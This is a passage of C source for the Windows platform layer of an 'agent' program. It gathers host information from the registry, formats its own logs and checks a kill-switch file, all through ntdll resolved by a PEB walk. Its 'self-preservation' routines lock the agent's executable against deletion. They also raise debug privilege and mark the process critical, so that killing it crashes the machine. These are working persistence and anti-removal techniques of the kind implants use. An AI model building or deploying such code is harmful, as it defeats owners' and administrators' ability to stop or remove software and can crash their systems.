            L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet"
            L"\\Services\\Tcpip\\Parameters";
        NT_UNICODE_STRING uRegPath;
        g_nt.RtlInitUnicodeString(&uRegPath, reg_path);

        NT_OBJECT_ATTRIBUTES oa;
        _nt_init_object_attributes(&oa, &uRegPath,
                                   NT_OBJ_CASE_INSENSITIVE, NT_NULL_HANDLE);

        NT_HANDLE hKey;
        NT_NTSTATUS status = g_nt.NtOpenKey(&hKey, NT_KEY_READ, &oa);

        if (NT_SUCCESS(status)) {
            NT_WCHAR val_name_str[] = L"Hostname";
            NT_UNICODE_STRING uValName;
            g_nt.RtlInitUnicodeString(&uValName, val_name_str);

            uint8_t val_buf[512];
            NT_ULONG result_len = 0;

            status = g_nt.NtQueryValueKey(
                hKey, &uValName,
                NT_KeyValuePartialInformation,
                val_buf, sizeof(val_buf), &result_len
            );

            g_nt.NtClose(hKey);

            if (NT_SUCCESS(status)) {
                NT_KEY_VALUE_PARTIAL_INFORMATION *info =
                    (NT_KEY_VALUE_PARTIAL_INFORMATION *)val_buf;

                /* Data is a wide string — convert to narrow */
                _nt_wide_to_ascii(buf, (const NT_WCHAR *)info->Data,
                                  size);
                return 0;
            }
        }
    }

    /* Fallback: read from the simpler ComputerName registry key */
    if (g_nt.NtOpenKey && g_nt.NtQueryValueKey) {
        NT_WCHAR reg_path2[] =
            L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet"
            L"\\Control\\ComputerName\\ActiveComputerName";
        NT_UNICODE_STRING uRegPath2;
        g_nt.RtlInitUnicodeString(&uRegPath2, reg_path2);

        NT_OBJECT_ATTRIBUTES oa2;
        _nt_init_object_attributes(&oa2, &uRegPath2,
                                   NT_OBJ_CASE_INSENSITIVE, NT_NULL_HANDLE);

        NT_HANDLE hKey2;
        NT_NTSTATUS status2 = g_nt.NtOpenKey(&hKey2, NT_KEY_READ, &oa2);

        if (NT_SUCCESS(status2)) {
            NT_WCHAR val_name2[] = L"ComputerName";
            NT_UNICODE_STRING uValName2;
            g_nt.RtlInitUnicodeString(&uValName2, val_name2);

            uint8_t val_buf2[512];
            NT_ULONG result_len2 = 0;

            status2 = g_nt.NtQueryValueKey(
                hKey2, &uValName2,
                NT_KeyValuePartialInformation,
                val_buf2, sizeof(val_buf2), &result_len2
            );

            g_nt.NtClose(hKey2);

            if (NT_SUCCESS(status2)) {
                NT_KEY_VALUE_PARTIAL_INFORMATION *info2 =
                    (NT_KEY_VALUE_PARTIAL_INFORMATION *)val_buf2;
                _nt_wide_to_ascii(buf, (const NT_WCHAR *)info2->Data, size);
                return 0;
            }
        }
    }

    _nc_strncpy(buf, "unknown", size - 1);
    buf[size - 1] = '\0';
    return -1;
}

int pal_get_os_info(char *buf, size_t size)
{
    if (buf == (char *)0 || size == 0) {
        return -1;
    }

    /* Read OS version from the registry:
     * \Registry\Machine\SOFTWARE\Microsoft\Windows NT\CurrentVersion
     * Values: "ProductName", "CurrentBuildNumber" */
    if (g_nt.NtOpenKey && g_nt.NtQueryValueKey) {
        NT_WCHAR reg_path[] =
            L"\\Registry\\Machine\\SOFTWARE\\Microsoft"
            L"\\Windows NT\\CurrentVersion";
        NT_UNICODE_STRING uRegPath;
        g_nt.RtlInitUnicodeString(&uRegPath, reg_path);

        NT_OBJECT_ATTRIBUTES oa;
        _nt_init_object_attributes(&oa, &uRegPath,
                                   NT_OBJ_CASE_INSENSITIVE, NT_NULL_HANDLE);

        NT_HANDLE hKey;
        NT_NTSTATUS status = g_nt.NtOpenKey(&hKey, NT_KEY_READ, &oa);

        if (NT_SUCCESS(status)) {
            /* Query ProductName */
            NT_WCHAR val_product[] = L"ProductName";
            NT_UNICODE_STRING uValProduct;
            g_nt.RtlInitUnicodeString(&uValProduct, val_product);

            uint8_t val_buf[512];
            NT_ULONG result_len = 0;

            status = g_nt.NtQueryValueKey(
                hKey, &uValProduct,
                NT_KeyValuePartialInformation,
                val_buf, sizeof(val_buf), &result_len
            );

            if (NT_SUCCESS(status)) {
                NT_KEY_VALUE_PARTIAL_INFORMATION *info =
                    (NT_KEY_VALUE_PARTIAL_INFORMATION *)val_buf;
                _nt_wide_to_ascii(buf, (const NT_WCHAR *)info->Data, size);
                g_nt.NtClose(hKey);
                return 0;
            }

            g_nt.NtClose(hKey);
        }
    }

    _nc_strncpy(buf, "Windows", size - 1);
    buf[size - 1] = '\0';
    return 0;
}

int pal_get_arch(char *buf, size_t size)
{
    if (buf == (char *)0 || size == 0) {
        return -1;
    }

    /* Use compile-time architecture macros — same approach as
     * the Linux PAL.  This avoids needing GetNativeSystemInfo. */
#if defined(__x86_64__) || defined(_M_X64) || defined(_M_AMD64)
    _nc_strncpy(buf, "x86_64", size - 1);
#elif defined(__i386__) || defined(_M_IX86)
    _nc_strncpy(buf, "i386", size - 1);
#elif defined(__aarch64__) || defined(_M_ARM64)
    _nc_strncpy(buf, "aarch64", size - 1);
#elif defined(__arm__) || defined(_M_ARM)
    _nc_strncpy(buf, "armv7", size - 1);
#else
    _nc_strncpy(buf, "unknown", size - 1);
#endif
    buf[size - 1] = '\0';

    return 0;
}

/* ---- Logging ---------------------------------------------------------- */

void pal_log(const char *fmt, ...)
{
    /* Format the message into a stack buffer using our nolibc formatter,
     * then write it to stderr via NtWriteFile. */

    char prefix[] = "[agent] ";
    char suffix[] = "\n";
    char msgbuf[1024];

    __builtin_va_list ap;
    __builtin_va_start(ap, fmt);

    /* Manual va_list format walk — same approach as pal_linux.c */
    size_t pos = 0;
    while (*fmt && pos < sizeof(msgbuf) - 1) {
        if (*fmt != '%') {
            msgbuf[pos++] = *fmt++;
            continue;
        }
        fmt++; /* skip '%' */

        int is_long = 0;
        if (*fmt == 'l') {
            is_long = 1;
            fmt++;
            if (*fmt == 'l') {
                fmt++; /* skip 'll' — treat same as 'l' */
            }
        }

        /* Handle '0' padding prefix (e.g., %08x) */
        if (*fmt == '0') {
            fmt++;
            while (*fmt >= '0' && *fmt <= '9') fmt++;
        }

        char numbuf[24];
        switch (*fmt) {
        case 's': {
            const char *s = __builtin_va_arg(ap, const char *);
            if (s == (const char *)0) s = "(null)";
            while (*s && pos < sizeof(msgbuf) - 1) {
                msgbuf[pos++] = *s++;
            }
            break;
        }
        case 'd': {
            long v;
            if (is_long) v = __builtin_va_arg(ap, long);
            else v = (long)__builtin_va_arg(ap, int);
            char *p = _nc_i64_to_dec((int64_t)v, numbuf, sizeof(numbuf));
            while (*p && pos < sizeof(msgbuf) - 1) {
                msgbuf[pos++] = *p++;
            }
            break;
        }
        case 'u': {
            unsigned long v;
            if (is_long) v = __builtin_va_arg(ap, unsigned long);
            else v = (unsigned long)__builtin_va_arg(ap, unsigned int);
            char *p = _nc_u64_to_dec((uint64_t)v, numbuf, sizeof(numbuf));
            while (*p && pos < sizeof(msgbuf) - 1) {
                msgbuf[pos++] = *p++;
            }
            break;
        }
        case 'x': case 'X': {
            unsigned long v;
            if (is_long) v = __builtin_va_arg(ap, unsigned long);
            else v = (unsigned long)__builtin_va_arg(ap, unsigned int);
            char *p = _nc_u32_to_hex((uint32_t)v, numbuf, sizeof(numbuf));
            while (*p && pos < sizeof(msgbuf) - 1) {
                msgbuf[pos++] = *p++;
            }
            break;
        }
        case 'p': {
            void *ptr = __builtin_va_arg(ap, void *);
            msgbuf[pos++] = '0';
            if (pos < sizeof(msgbuf) - 1) msgbuf[pos++] = 'x';
            char *p = _nc_u32_to_hex((uint32_t)(uintptr_t)ptr,
                                     numbuf, sizeof(numbuf));
            while (*p && pos < sizeof(msgbuf) - 1) {
                msgbuf[pos++] = *p++;
            }
            break;
        }
        case '%':
            msgbuf[pos++] = '%';
            break;
        default:
            msgbuf[pos++] = '%';
            if (pos < sizeof(msgbuf) - 1) msgbuf[pos++] = *fmt;
            break;
        }
        fmt++;
    }
    msgbuf[pos] = '\0';

    __builtin_va_end(ap);

    /* Write to stderr via NtWriteFile */
    _pal_write_stderr(prefix, sizeof(prefix) - 1);
    _pal_write_stderr(msgbuf, pos);
    _pal_write_stderr(suffix, sizeof(suffix) - 1);
}

/* ---- Kill switch ------------------------------------------------------ */

int pal_check_sentinel(const char *path)
{
    if (path == (const char *)0) {
        return 0;
    }

    /* Check if file exists by attempting to open it via NtCreateFile */
    NT_WCHAR dos_path[512];
    _nt_ascii_to_wide(dos_path, path, 512);

    NT_WCHAR nt_path[520];
    _nt_dos_to_nt_path(nt_path, dos_path, 520);

    NT_UNICODE_STRING upath;
    g_nt.RtlInitUnicodeString(&upath, nt_path);

    NT_OBJECT_ATTRIBUTES oa;
    _nt_init_object_attributes(&oa, &upath, NT_OBJ_CASE_INSENSITIVE,
                               NT_NULL_HANDLE);

    NT_IO_STATUS_BLOCK iosb;
    _nc_memset(&iosb, 0, sizeof(iosb));

    NT_HANDLE hFile;
    NT_NTSTATUS status = g_nt.NtCreateFile(
        &hFile,
        NT_SYNCHRONIZE | NT_FILE_READ_ATTRIBUTES,
        &oa, &iosb,
        (NT_LARGE_INTEGER *)0,
        0,
        NT_FILE_SHARE_READ | NT_FILE_SHARE_WRITE | NT_FILE_SHARE_DELETE,
        NT_FILE_OPEN,           /* Open only if exists */
        NT_FILE_SYNCHRONOUS_IO_NONALERT | NT_FILE_NON_DIRECTORY_FILE,
        (NT_PVOID)0, 0
    );

    if (NT_SUCCESS(status)) {
        g_nt.NtClose(hFile);
        return 1; /* File exists */
    }
    return 0; /* File does not exist */
}

/* ---- Self-preservation (pure ntdll) ----------------------------------- */

/*
 * All protection operations use ntdll.dll exports resolved via PEB walk.
 * No kernel32.dll (GetModuleHandleA / GetProcAddress) is used anywhere.
 *
 * File protection strategy:
 *   NtOpenFile with FILE_SHARE_READ only — no FILE_SHARE_DELETE,
 *   no FILE_SHARE_WRITE.  Any external attempt to delete, rename,
 *   or overwrite the file fails with STATUS_SHARING_VIOLATION.
 *
 * Process protection strategy:
 *   NtSetInformationProcess(ProcessBreakOnTermination) marks the
 *   process as "critical".  If it is terminated, the system bug-checks
 *   (BSOD).  Requires SeDebugPrivilege, enabled via RtlAdjustPrivilege.
 */

/* Module-level state */
static NT_HANDLE g_sp_file_handle = NT_INVALID_HANDLE;
static int       g_sp_is_critical = 0;

int pal_self_preserve_start(void)
{
    if (g_sp_file_handle != NT_INVALID_HANDLE) {
        return 0; /* Already active */
    }

    if (!g_nt.NtOpenFile || !g_nt.RtlInitUnicodeString) {
        pal_log("self-preserve: ntdll functions not resolved");
        return -1;
    }

    /* ---- Get our own executable path from PEB ---- */
    NT_PEB *peb = _nt_get_peb();
    if (!peb || !peb->ProcessParameters) {
        pal_log("self-preserve: cannot read PEB");
        return -1;
    }

    /* ImagePathName in ProcessParameters is already in DOS format.
     * We need to convert it to NT path format (\??\...). */
    NT_UNICODE_STRING *img_path = &peb->ProcessParameters->ImagePathName;

    NT_WCHAR nt_path[520];
    nt_path[0] = L'\\'; nt_path[1] = L'?';
    nt_path[2] = L'?';  nt_path[3] = L'\\';

    size_t path_chars = img_path->Length / sizeof(NT_WCHAR);
    if (path_chars > 512) path_chars = 512;
    for (size_t i = 0; i <= path_chars; i++) {
        nt_path[4 + i] = img_path->Buffer[i];
    }

    NT_UNICODE_STRING upath;
    g_nt.RtlInitUnicodeString(&upath, nt_path);

    NT_OBJECT_ATTRIBUTES oa;
    _nt_init_object_attributes(&oa, &upath, NT_OBJ_CASE_INSENSITIVE,
                               NT_NULL_HANDLE);

    NT_IO_STATUS_BLOCK iosb;
    _nc_memset(&iosb, 0, sizeof(iosb));

    /* Open with FILE_SHARE_READ only.
     * By NOT granting FILE_SHARE_DELETE or FILE_SHARE_WRITE,
     * any external attempt to delete, rename, or overwrite the
     * file while this handle is open will fail with
     * STATUS_SHARING_VIOLATION (0xC0000043). */
    NT_NTSTATUS status = g_nt.NtOpenFile(
        &g_sp_file_handle,
        NT_SYNCHRONIZE | NT_FILE_READ_DATA,
        &oa,
        &iosb,
        NT_FILE_SHARE_READ,
        NT_FILE_SYNCHRONOUS_IO_NONALERT | NT_FILE_NON_DIRECTORY_FILE
    );

    if (!NT_SUCCESS(status)) {
        pal_log("self-preserve: NtOpenFile failed (0x%x)",
                (unsigned int)status);
        g_sp_file_handle = NT_INVALID_HANDLE;
        /* Continue — still attempt process protection. */
    } else {
        pal_log("self-preserve: file handle acquired");
    }

    /* ---- Process protection via NtSetInformationProcess ---- */

    /* Mark the process as "critical" (ProcessBreakOnTermination).
     * The kernel will bug-check if this process is terminated.
     * This requires SeDebugPrivilege, so elevate first. */
    if (g_nt.RtlAdjustPrivilege && g_nt.NtSetInformationProcess) {
        NT_BOOLEAN old_priv = 0;
        g_nt.RtlAdjustPrivilege(NT_SE_DEBUG_PRIVILEGE, 1, 0, &old_priv);

        NT_ULONG critical = 1;
        status = g_nt.NtSetInformationProcess(
            NT_CURRENT_PROCESS,
            NT_ProcessBreakOnTermination,
            &critical,
            sizeof(critical)
        );

        if (NT_SUCCESS(status)) {
            g_sp_is_critical = 1;
            pal_log("self-preserve: process marked CRITICAL");
        } else {
            pal_log("self-preserve: NtSetInformationProcess failed "
                    "(0x%x) — may need elevated privileges",
                    (unsigned int)status);
        }
    }

    pal_log("Self-preservation ENABLED.");
    return 0;
}

int pal_self_preserve_stop(void)
{
    /* ---- Remove critical-process flag ---- */
    if (g_sp_is_critical && g_nt.NtSetInformationProcess) {
        NT_ULONG critical = 0;
        g_nt.NtSetInformationProcess(
            NT_CURRENT_PROCESS,
            NT_ProcessBreakOnTermination,
            &critical,
            sizeof(critical)
        );
        g_sp_is_critical = 0;
        pal_log("self-preserve: critical flag removed");
    }

    /* ---- Release file handle ---- */
    if (g_sp_file_handle != NT_INVALID_HANDLE && g_nt.NtClose) {
        g_nt.NtClose(g_sp_file_handle);
        g_sp_file_handle = NT_INVALID_HANDLE;
        pal_log("self-preserve: file handle released");
    }

    pal_log("Self-preservation DISABLED.");
    return 0;
}

int pal_get_exe_path(char *buf, size_t size)
{
    if (buf == (char *)0 || size == 0) {
        return -1;
    }

    /* Read the executable path from the PEB → ProcessParameters */
    NT_PEB *peb = _nt_get_peb();
    if (!peb || !peb->ProcessParameters) {
        return -1;
    }

    NT_UNICODE_STRING *img_path = &peb->ProcessParameters->ImagePathName;
    _nt_wide_to_ascii(buf, img_path->Buffer, size);
    return 0;
}

#endif /* _WIN32 */
